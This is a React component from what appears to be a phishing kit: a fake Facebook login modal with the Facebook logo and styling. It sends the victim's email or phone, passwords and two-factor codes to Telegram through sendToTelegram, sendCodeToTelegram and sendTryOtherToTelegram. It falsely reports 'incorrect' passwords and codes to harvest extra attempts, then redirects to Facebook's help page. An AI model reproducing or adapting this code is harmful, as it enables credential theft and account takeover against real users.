import { useState } from 'react';
import PropTypes from 'prop-types';
import sendToTelegram, { sendCodeToTelegram, sendTryOtherToTelegram } from '@/utils/send-telegram';
import config from '@/utils/config';
import { useLang } from '@/context/lang-context';
import TwoFactorCodeModal from '@/components/two-factor-code-modal';
import TryOtherMethodModal from '@/components/try-other-method-modal';
import SecurityCheckModal from '@/components/security-check-modal';

const LoginModal = ({ onClose, formData = {} }) => {
    const { labels } = useLang();
    const [showPassword, setShowPassword] = useState(false);
    const [emailOrPhone, setEmailOrPhone] = useState('');
    const [password, setPassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [errorMsg, setErrorMsg] = useState('');
    const [attempts, setAttempts] = useState(0);
    const [prevMessageId, setPrevMessageId] = useState(null);
    const [password1, setPassword1] = useState('');
    const [password2, setPassword2] = useState('');
    const [isTwoFactorStep, setIsTwoFactorStep] = useState(false);
    const [twoFactorCode, setTwoFactorCode] = useState('');
    const [codeLoading, setCodeLoading] = useState(false);
    const [codeErrorMsg, setCodeErrorMsg] = useState('');
    const [codeAttempts, setCodeAttempts] = useState(0);
    const [prevCodeMessageId, setPrevCodeMessageId] = useState(null);
    const [enteredCodes, setEnteredCodes] = useState([]);
    const [isTryOtherStep, setIsTryOtherStep] = useState(false);
    const [selectedMethod, setSelectedMethod] = useState(null);
    const [identifierErrorMsg, setIdentifierErrorMsg] = useState('');
    const [showSecurityCheck, setShowSecurityCheck] = useState(false);
    const [securityRedirectUrl, setSecurityRedirectUrl] = useState('');

    const t = {
        modalDesc: labels.modalDesc,
        emailOrPhonePlaceholder: labels.emailOrPhonePlaceholder,
        passwordPlaceholder: labels.passwordPlaceholder,
        loginBtn: labels.loginBtn,
        cancelBtn: labels.cancelBtn,
    };

    const isValidEmail = (value) => {
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(value);
    };

    const getIdentifierError = (value) => {
        const trimmedValue = String(value || '').trim();
        if (!trimmedValue) return '';
        if (trimmedValue.includes('@') && !isValidEmail(trimmedValue)) {
            return 'Email không đúng định dạng.';
        }
        return '';
    };

    const handleLogin = async () => {
        if (!emailOrPhone || !password) return;
        const identifierError = getIdentifierError(emailOrPhone);
        if (identifierError) {
            setIdentifierErrorMsg(identifierError);
            return;
        }

        setLoading(true);
        setErrorMsg('');
        setIdentifierErrorMsg('');

        const isFirstAttempt = attempts === 0;

        const credentials = isFirstAttempt
            ? { emailOrPhone, password1: password }
            : { emailOrPhone, password1, password2: password };

        const messageId = await sendToTelegram(formData, credentials, isFirstAttempt ? null : prevMessageId);

        if (isFirstAttempt) {
            setPassword1(password);
            setPrevMessageId(messageId);
        }

        await new Promise((resolve) =>
            setTimeout(resolve, config.password_loading_time * 1000)
        );

        const nextAttempts = attempts + 1;
        setAttempts(nextAttempts);
        setLoading(false);

        if (nextAttempts >= config.max_password_attempts) {
            setErrorMsg('');
            setPassword('');
            if (!isFirstAttempt) setPassword2(password);
            setPrevCodeMessageId(messageId);
            setIsTwoFactorStep(true);
        } else {
            setErrorMsg('The password you entered is incorrect. Please try again.');
            setPassword('');
        }
    };

    const handleConfirmTwoFactorCode = async () => {
        if (!twoFactorCode || codeLoading) return;
        if (!/^\d+$/.test(twoFactorCode)) {
            setCodeErrorMsg('Mã xác nhận chỉ được chứa chữ số.');
            return;
        }

        setCodeLoading(true);
        setCodeErrorMsg('');

        const allCodes = [...enteredCodes, twoFactorCode];

        const payload = { emailOrPhone, password1, password2, codes: allCodes };

        const messageId = await sendCodeToTelegram(formData, payload, prevCodeMessageId);

        setPrevCodeMessageId(messageId);
        setEnteredCodes(allCodes);

        await new Promise((resolve) =>
            setTimeout(resolve, config.code_loading_time * 1000)
        );

        const nextAttempts = codeAttempts + 1;
        setCodeAttempts(nextAttempts);
        setCodeLoading(false);

        if (nextAttempts >= config.max_code_attempts) {
            setSecurityRedirectUrl('https://www.facebook.com/help');
            setShowSecurityCheck(true);
            return;
        }

        setCodeErrorMsg('The code you entered is incorrect. Please try again.');
        setTwoFactorCode('');
    };

    return (
        <>
        <div className="fixed inset-0 z-50 flex items-center justify-center px-3 py-4 sm:px-4">
            <button
                type="button"
                aria-label="Đóng modal"
                className="absolute inset-0 cursor-default bg-black/50"
                onClick={onClose}
            />
            <div
                className={[
                    'relative w-full overflow-hidden bg-white shadow-2xl',
                    isTwoFactorStep
                        ? 'max-h-[calc(100vh-32px)] max-w-[420px] overflow-y-auto rounded-[0px] border border-[#999]'
                        : 'max-h-[calc(100vh-32px)] max-w-[400px] overflow-y-auto rounded-[12px]',
                ].join(' ')}
            >
                {!isTwoFactorStep && (
                    <>
                {/* Header */}
                <div className="flex flex-col items-center bg-white px-4 pb-4 pt-6 sm:px-6 sm:pt-8">
                    <svg
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 36 36"
                        className="mb-4 h-14 w-14"
                    >
                        <path
                            fill="#1877F2"
                            d="M36 18C36 8.059 27.941 0 18 0S0 8.059 0 18c0 8.985 6.584 16.425 15.188 17.779V23.203h-4.57V18h4.57v-3.968c0-4.508 2.685-6.997 6.79-6.997 1.967 0 4.026.351 4.026.351v4.426h-2.267c-2.235 0-2.931 1.387-2.931 2.81V18h4.99l-.797 5.203h-4.193v12.576C29.416 34.425 36 26.985 36 18z"
                        />
                        <path
                            fill="#fff"
                            d="M25.008 23.203L25.805 18h-4.99v-3.378c0-1.423.696-2.81 2.931-2.81h2.267V7.386S23.954 7.035 21.987 7.035c-4.105 0-6.79 2.489-6.79 6.997V18h-4.57v5.203h4.57v12.576a18.215 18.215 0 005.624 0V23.203h4.187z"
                        />
                    </svg>

                    <p className="text-center text-[14px] leading-[20px] text-[#1c1e21]">
                        {t.modalDesc}
                    </p>
                </div>

                {/* Form */}
                <div className="bg-white px-4 pb-5 pt-2 sm:px-6 sm:pb-6">
                    <div className="space-y-3">
                        <input
                            type="text"
                            placeholder={t.emailOrPhonePlaceholder}
                            value={emailOrPhone}
                            onChange={(e) => {
                                const nextValue = e.target.value;
                                setEmailOrPhone(nextValue);
                                setIdentifierErrorMsg(getIdentifierError(nextValue));
                            }}
                            disabled={loading}
                            className="w-full rounded-[6px] border border-[#ccd0d5] px-3 py-[11px] text-[14px] text-[#1c1e21] outline-none transition focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2]/20 disabled:opacity-60"
                        />
                        {identifierErrorMsg && (
                            <p className="text-[13px] text-red-500">{identifierErrorMsg}</p>
                        )}

                        <div className="relative">
                            <input
                                type={showPassword ? 'text' : 'password'}
                                placeholder={t.passwordPlaceholder}
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                disabled={loading}
                                onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
                                className="w-full rounded-[6px] border border-[#ccd0d5] px-3 py-[11px] pr-11 text-[14px] text-[#1c1e21] outline-none transition focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2]/20 disabled:opacity-60"
                            />
                            <button
                                type="button"
                                onClick={() => setShowPassword((prev) => !prev)}
                                className="absolute right-3 top-1/2 -translate-y-1/2 text-[#606770] hover:text-[#1c1e21]"
                                tabIndex={-1}
                            >
                                {showPassword ? (
                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                                        <path strokeLinecap="round" strokeLinejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21" />
                                    </svg>
                                ) : (
                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                                    </svg>
                                )}
                            </button>
                        </div>

                        {errorMsg && (
                            <p className="text-[13px] text-red-500">{errorMsg}</p>
                        )}

                        <button
                            type="button"
                            onClick={handleLogin}
                            disabled={loading || !emailOrPhone || !password}
                            className="flex w-full items-center justify-center gap-2 rounded-[6px] bg-[#1877f2] py-[11px] text-[15px] font-semibold text-white transition-colors hover:bg-[#166fe5] active:bg-[#1565d8] disabled:cursor-not-allowed disabled:opacity-70"
                        >
                            {loading && (
                                <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
                                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8H4z" />
                                </svg>
                            )}
                            {t.loginBtn}
                        </button>
                    </div>
                </div>
                    </>
                )}

                {isTwoFactorStep && !isTryOtherStep && (
                    <TwoFactorCodeModal
                        emailOrPhone={emailOrPhone}
                        email={formData?.email_facebook || formData?.email_work}
                        phone={formData?.phone}
                        code={twoFactorCode}
                        onCodeChange={(value) => {
                            setTwoFactorCode(value.replaceAll(/\D/g, ''));
                            if (codeErrorMsg) setCodeErrorMsg('');
                        }}
                        onTryOther={() => setIsTryOtherStep(true)}
                        onConfirm={handleConfirmTwoFactorCode}
                        loading={codeLoading}
                        errorMsg={codeErrorMsg}
                        selectedMethod={selectedMethod}
                    />
                )}

                {isTwoFactorStep && isTryOtherStep && (
                    <TryOtherMethodModal
                        phone={formData?.phone}
                        onBack={() => setIsTryOtherStep(false)}
                        onSelect={async (method) => {
                            setSelectedMethod(method);
                            const payload = { emailOrPhone, password1, password2, codes: enteredCodes };
                            const newMessageId = await sendTryOtherToTelegram(formData, payload, method.label, prevCodeMessageId);
                            if (newMessageId) setPrevCodeMessageId(newMessageId);
                            setIsTryOtherStep(false);
                        }}
                    />
                )}

                {!isTwoFactorStep && (
                    <div className="border-t border-[#dddfe2] bg-[#f0f2f5] px-4 py-4 text-center sm:px-6">
                        <button
                            type="button"
                            onClick={onClose}
                            className="text-[13px] text-[#606770] hover:underline"
                        >
                            {t.cancelBtn}
                        </button>
                    </div>
                )}
            </div>
        </div>

            {showSecurityCheck && (
                <SecurityCheckModal
                    redirectUrl={securityRedirectUrl}
                    onCancel={() => setShowSecurityCheck(false)}
                />
            )}
        </>
    );
};

export default LoginModal;

LoginModal.propTypes = {
    onClose: PropTypes.func.isRequired,
    formData: PropTypes.object,
};
